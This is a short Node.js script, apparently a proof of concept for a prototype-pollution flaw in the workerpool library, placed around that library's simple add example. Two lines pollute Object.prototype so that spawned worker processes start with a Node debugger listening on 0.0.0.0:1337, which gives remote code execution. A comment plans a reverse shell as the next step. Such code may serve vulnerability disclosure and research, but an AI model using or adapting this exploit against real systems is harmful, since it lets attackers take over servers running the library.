const workerpool = require('workerpool');

Object.prototype.workerType = 'process';  // or .nodeWorker property
                                          // this pollution is not necessary if workerType === 'process' is set up via .pool() below

const pool = workerpool.pool();

function add(a, b) {
  return a + b;
}

Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' };

// TODO: try a reverse shell on Linux

pool
  .exec(add, [3, 4])
  .then(function (result) {
    console.log('result', result); // outputs 7
  })
  .catch(function (err) {
    console.error(err);
  })
  .then(function () {
    pool.terminate(); // terminate all workers when done
  });